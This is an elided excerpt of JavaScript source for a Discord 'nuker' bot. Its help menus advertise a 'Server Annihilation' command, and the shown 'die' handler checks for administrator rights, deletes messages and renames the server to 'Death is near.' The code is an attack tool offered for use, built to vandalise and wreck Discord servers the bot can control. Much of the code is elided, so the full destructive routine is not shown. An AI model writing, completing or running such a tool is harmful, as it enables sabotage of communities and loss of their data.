...
client.on("ready", () => {
    ...
    console.log(red('           ════════════════════════════════════════════════════════════════════════════════'));
    console.log("");
    client.user.setActivity({ type: "WATCHING", name: "DanGer | Die" }); // Delete this if you wish.
});
    ...
    if (message.mentions.everyone === true) {
        ...
        const helpEmbed = new Discord.MessageEmbed()
            ...
            **Server Annihilation:** \`${prefix}die\` [text]
            ...
            .setFooter(`© Presser | Prefix: ${prefix} | Cord: ${founder}`)
            .setColor(0x36393E)
        ...
        if (message.content.startsWith(prefix + 'help')) {
            const helpEmbed = new Discord.MessageEmbed()
                ...
                **Server Annihilation:** \`${prefix}die\` [text]
                ...
                .setFooter(`©DanGer | Prefix: ${prefix} | Cord: ${founder}`)
                .setColor(0x36393E)
                .setTimestamp(Date.now());
            message.channel.send(helpEmbed);
            message.delete();
            ...
            if (message.author.id != myID) {
                ...
                const helpEmbed = new Discord.MessageEmbed()
                    ...
                    **Server Annihilation:** \`${prefix}die\` [text]
                    `)
                    .setThumbnail(`https://media.discordapp.net/attachments/782211616350404611/800703659435622430/death_grips.gif`)
                    .setFooter(`©DanGer | Prefix: ${prefix} | Founder: ${founder}`)
                    .setColor(0x36393E)
                    .setTimestamp(Date.now());
                message.channel.send(helpEmbed);
            }
    ...
    if (message.content.startsWith(prefix + 'die')) {
        if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
            ...
            if (message.author.id != myID) {
                ...
                message.delete();
                message.guild.setName(`Death is near.`).then(console.log(green(`Server Name changed to: ${message.guild.name}`))); // changes server name
